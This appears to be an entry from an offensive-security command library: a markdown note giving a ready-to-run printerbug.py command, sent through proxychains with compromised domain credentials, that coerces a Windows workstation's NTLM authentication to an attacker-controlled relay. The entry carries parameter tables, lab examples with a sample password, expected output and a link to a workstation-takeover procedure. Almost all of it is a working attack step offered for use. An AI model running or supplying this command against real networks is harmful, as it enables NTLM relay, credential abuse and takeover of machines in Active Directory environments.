---
type: command
executor: bash
data: >-
  proxychains python3 printerbug.py
  $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_WORKSTATION
  $_RELAY_HOST@$_RELAY_PORT/file
tags:
  - printer-bug
  - ntlm-coerce
  - authentication-trigger
platforms:
  - Linux
verified: true
validated: true
---

# printer-bug-trigger-authentication

## Command

```bash
proxychains python3 printerbug.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_WORKSTATION $_RELAY_HOST@$_RELAY_PORT/file
```

## Description

Triggers NTLM authentication from a target workstation using the printer bug (RPC spooler vulnerability) to coerce auth to an attacker-controlled relay server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain (e.g., ez.lab) | Yes |
| $_USERNAME | Compromised username (e.g., matt) | Yes |
| $_PASSWORD | User password (e.g., Password1!) | Yes |
| $_TARGET_WORKSTATION | Target workstation FQDN (e.g., ws2.ez.lab) | Yes |
| $_RELAY_HOST | Relay listener host/port (e.g., ws1@8081) | Yes |
| /file | Dummy path for the request | Yes |
| proxychains | Use SOCKS proxy for execution | No |

## Examples

### Basic Usage

```bash
proxychains python3 printerbug.py ez.lab/matt:Password1!@ws2.ez.lab ws1@8081/file
```

### Advanced Usage

```bash
proxychains python3 printerbug.py ez.lab/matt:Password1!@ws2.ez.lab ws1@8081/file -debug
```

## Expected Output

Sending RPC to target...
Authentication triggered to relay
(No errors, relay logs show incoming NTLM)

## Related

- [[procedures/Workstation-Takeover-with-RBCD]]
- [[tools/Impacket]]
